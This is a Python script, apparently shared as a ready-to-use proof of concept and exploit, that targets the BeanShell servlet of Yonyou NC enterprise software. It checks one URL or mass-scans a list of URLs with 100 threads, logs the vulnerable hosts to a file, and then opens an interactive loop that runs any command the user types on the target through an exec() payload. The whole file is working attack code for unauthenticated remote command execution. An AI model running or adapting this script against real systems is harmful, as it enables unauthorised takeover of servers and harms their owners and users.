import sys,re,time,requests,argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
 ▄▄       ▄▄  ▄         ▄       ▄         ▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄            ▄▄▄▄▄▄▄▄▄▄  
▐░░▌     ▐░░▌▐░▌       ▐░▌     ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌          ▐░░░░░░░░░░▌ 
▐░▌░▌   ▐░▐░▌▐░▌       ▐░▌     ▐░▌       ▐░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░▌          ▐░█▀▀▀▀▀▀▀█░▌
▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌     ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌ ▐░▐░▌ ▐░▌▐░█▄▄▄▄▄▄▄█░▌     ▐░▌   ▄   ▐░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌          ▐░▌       ▐░▌
▐░▌  ▐░▌  ▐░▌▐░░░░░░░░░░░▌     ▐░▌  ▐░▌  ▐░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌          ▐░▌       ▐░▌
▐░▌   ▀   ▐░▌ ▀▀▀▀█░█▀▀▀▀      ▐░▌ ▐░▌░▌ ▐░▌▐░▌       ▐░▌▐░█▀▀▀▀█░█▀▀ ▐░▌          ▐░▌       ▐░▌
▐░▌       ▐░▌     ▐░▌          ▐░▌▐░▌ ▐░▌▐░▌▐░▌       ▐░▌▐░▌     ▐░▌  ▐░▌          ▐░▌       ▐░▌
▐░▌       ▐░▌     ▐░▌          ▐░▌░▌   ▐░▐░▌▐░█▄▄▄▄▄▄▄█░▌▐░▌      ▐░▌ ▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌       ▐░▌     ▐░▌          ▐░░▌     ▐░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀         ▀       ▀            ▀▀       ▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
                                                                           version:15.7.3
                                                                           author :Hardog                                                                    
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="用友nc命令执行poc&exp")
    parser.add_argument('-u','--url',type=str,help='Please input link')
    parser.add_argument('-f','--file',type=str,help='File Path')

    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python3 {sys.argv[0]} -h")

def poc(target):
    header = {
        'Content-Length':'28',
        'Cache-Control':'max-age=0',
        'Upgrade-Insecure-Requests':'1',
        'Origin':'http://127.0.0.1', # 此处为目标网站网址
        'Content-Type':'application/x-www-form-urlencoded',
        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko/125.0.0.0 Safari/537.36',
        'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Referer':'http://127.0.0.1/servlet/~ic/bsh.servlet.BshServlet', # 此处为目标网站网址
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9',
        'Cookie':'JSESSIONID=BCFBABDCFCBF9D0D7C482AF1BDFEF70D.server',
        'Connection':'close'
    }
    data = 'bsh.script=print("Hardog")'
    payload_url = '/servlet/~ic/bsh.servlet.BshServlet'
    url = target+payload_url

    try:
        res = requests.get(url=url)
        if res.status_code == 200:
            res2 = requests.post(url=url,headers=header,data=data)
            match = re.search(r'<pre>(.*?)</pre>',res2.text,re.S)
            if 'Hardog' in match.group(1):
                print(f"f[+]该网站存在漏洞，url为{target}")
                with open('result.txt','a',encoding='utf-8') as fp:
                    fp.write(target+"\n")
                    return True
            else:
                print(f"f[-]该网站不存在漏洞，url为{target}")
                return False
    except Exception as e:
        print(f"f[-]该网站无法访问，url为{target}"+e)
        return False

def exp(target):
    print("-------------该网站存在漏洞-------------")
    time.sleep(2)
    while True:
        cmd = input("请输入需要执行的命令-> ")
        if cmd == 'q':
            break
        headers = {
            'Content-Length':'28',
            'Cache-Control':'max-age=0',
            'Upgrade-Insecure-Requests':'1',
            'Origin':'http://127.0.0.1', # 此处为目标网站网址
            'Content-Type':'application/x-www-form-urlencoded',
            'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko/125.0.0.0 Safari/537.36',
            'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webapng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer':'http://127.0.0.1/servlet/~ic/bsh.servlet.BshServlet', # 此处为目标网站网址
            'Accept-Encoding':'gzip, deflate',
            'Accept-Language':'zh-CN,zh;q=0.9',
            'Cookie':'JSESSIONID=BCFBABDCFCBF9D0D7C482AF1BDFEF70D.server',
            'Connection':'close',
        }
        data = f'bsh.script=exec("{cmd}")'
        res = requests.post(url=target+'/servlet/~ic/bsh.servlet.BshServlet',headers=headers,data=data)
        match = re.search(r'<pre>(.*?)</pre>',res.text,re.S)
        print(match.group(1).strip())

if __name__ == '__main__':
    main()